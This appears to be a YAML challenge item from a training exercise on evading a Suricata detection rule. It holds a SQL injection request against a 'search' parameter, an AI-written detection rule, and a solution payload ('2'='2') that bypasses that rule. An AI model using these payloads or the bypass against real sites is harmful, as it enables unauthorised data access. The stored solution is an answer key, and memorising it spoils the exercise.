name: 'SQL Injection (Search) (AI)'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  I created this rule with the following prompt:

  ```
  Can you write a Suricata rule that will catch the following SQL injection attack over HTTP?

  GET /?search=nebula')%20or%20'1'='1'-- HTTP/1.1
  Host: localhost
  ```

  (No, I don't know why it always insists on using `http.uri.raw`! Its explanation is, `Uses http.uri.raw to detect unnormalized parameters and bypass Suricata's automatic URL decoding` - dunno why you'd consider that a feature, though!).

  **Goal: Fetch all records**

hints: []

target: taxonomy

base_request: |-
  GET /?search=nebula')%20or%20'1'='1'-- HTTP/1.1
  Host: localhost

solution: |-
  GET /?search=nebula')%20or%20'2'='2'-- HTTP/1.1
  Host: localhost

solution_note: Just used 2=2 again

rules:
# Lots of problems
- >
  alert http any any -> any any ( msg:"SQL Injection in 'search' Parameter (Classic '1'='1')"; flow:established,to_server; http.method; content:"GET"; http.uri.raw; content:"search="; fast_pattern; http.uri.raw; pcre:"/search=[^&]*('|%27)[^&]*or[^&]*('1'='1|%31%27%3d%27%31)/i"; classtype:web-application-attack; sid:1000007; rev:1;)

expected_output: "Flaggy flag"
